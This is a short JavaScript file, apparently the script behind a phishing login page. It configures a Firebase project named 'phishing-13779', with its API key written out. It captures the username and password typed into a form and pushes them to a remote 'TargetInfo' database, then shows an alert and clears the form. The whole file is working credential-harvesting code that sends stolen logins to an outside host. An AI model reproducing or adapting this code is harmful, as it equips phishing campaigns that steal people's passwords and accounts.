const firebaseConfig = {
    apiKey: "AIzaSyBylYvVvvgXpkIGtI_mJbaYzGoL_lGwsTk",
    authDomain: "phishing-13779.firebaseapp.com",
    databaseURL: "https://phishing-13779-default-rtdb.firebaseio.com",
    projectId: "phishing-13779",
    storageBucket: "phishing-13779.appspot.com",
    messagingSenderId: "1042174926237",
    appId: "1:1042174926237:web:8978c1870c5258e1b7a374"
  };

  firebase.initializeApp(firebaseConfig);

  var db = firebase.database().ref('TargetInfo')

  document.getElementById('infoForm').addEventListener('submit', submitForm)

  function submitForm(e){
    e.preventDefault();

    var uname = getElementVal('username');
    var passwd = getElementVal('password');

    //console.log(uname, passwd);
    saveData(uname, passwd);

    document.querySelector(".alert").style.display = "block";

    setInterval(() => {

        document.querySelector(".alert").style.display = "none";
        
    }, 3000);

    document.getElementById('infoForm').reset()

  }

  const saveData = (uname, passwd) => {
    var newinfoForm = db.push();

    newinfoForm.set({
        uname : uname,
        passwd : passwd

    });

  };

const getElementVal = (id) =>{
    return document.getElementById(id).value;
}
